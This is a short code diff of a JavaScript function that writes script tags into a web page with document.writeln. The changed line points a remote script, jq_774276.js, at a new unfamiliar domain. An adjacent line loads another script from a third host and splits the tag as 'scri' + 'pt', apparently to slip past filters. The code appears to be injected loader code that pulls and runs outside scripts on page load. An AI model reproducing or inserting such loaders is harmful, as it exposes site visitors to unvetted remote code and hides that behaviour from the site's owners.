@@ -165,7 +165,7 @@ function loadOther() {
         //     opacity = third_opacity_css;
         // }
         document.writeln('<div style="' + opacity + '">');
-        document.writeln('<script src="https://m.b.xiangwangdesh.com/hm/cdn/static/jq_774276.js"></script>');
+        document.writeln('<script src="https://cdn.nmzzlhwlkj.com/hm/cdn/static/jq_774276.js"></script>');
         document.writeln('<scri' + 'pt src="//spl.ztvx8.com/wlzys5.js"> </scri' + 'pt>');
         document.writeln('</div>');
     }
